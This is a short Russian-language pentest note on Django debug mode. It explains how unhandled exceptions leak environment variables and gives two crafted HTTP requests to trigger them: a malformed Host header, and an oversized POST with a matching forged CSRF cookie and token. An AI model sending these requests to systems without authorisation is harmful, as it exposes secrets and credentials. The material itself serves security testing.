# Security

## Debug mode

Source: [https://t.me/webpwn/337](https://t.me/webpwn/337)

Приложения на Django в debug режиме раскрывают содержимое environment переменных при необработанном исключении.

Несмотря на наличие автоматического сокрытия значений, для переменных соответствующих регулярному выражению `API|TOKEN|KEY|SECRET|PASS|SIGNATURE`, часто это приводит к утечкам через нестандартные имена переменных.

Если обнаружить debug режим можно просто обратившись к несуществующей странице, то вызвать exception иногда бывает проблематично. Даже с раскрытием существующих в приложении путей через 404-ую страницу.

Но существуют и более универсальные подходы.

**Пример 1**

Нестандартные символы в Host. Правда с учетом облачных сервисов этот вариант срабатывает редко.

```
GET / HTTP/1.1
Host: '"

Invalid HTTP_HOST header: '\'"'. The domain name provided is not valid according to RFC 1034/1035.
```

**Пример 2**

Использование большего количества переменных в POST, чем указано в настройке DATA\_UPLOAD\_MAX\_NUMBER\_FIELDS (по умолчанию 1000).

Для эксплуатации необходимо найти любой роут, поддерживающий POST запросы, и в редких случаях получить валидное значение CSRF токена на странице.

```
POST / HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Cookie: csrftoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;
Content-Length: 3093
 
csrfmiddlewaretoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&x=&x=&x=&x=[..1000 раз..]&x=&x=&x=
```
